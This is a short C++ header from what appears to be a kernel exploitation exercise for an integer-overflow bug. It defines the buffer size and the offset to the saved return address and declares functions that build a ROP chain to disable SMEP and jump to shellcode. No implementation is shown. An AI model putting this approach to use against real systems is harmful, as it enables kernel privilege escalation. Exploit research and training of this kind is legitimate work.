#pragma once

#include "DefinesMacros.hpp"

namespace IntegerOverflow
{
	static constexpr size_t KERNEL_BUFFER_SIZE = 0x800;
	static constexpr size_t OFFSET_TO_RIP = KERNEL_BUFFER_SIZE + sizeof(Address64) * 5;
	static constexpr size_t OVERFLOW_BUFFER_SIZE = PAGE_SIZE;

	void disable_smep_rop(ByteVector& in_buffer, Address64 shellcode_address);

	void exploit();

}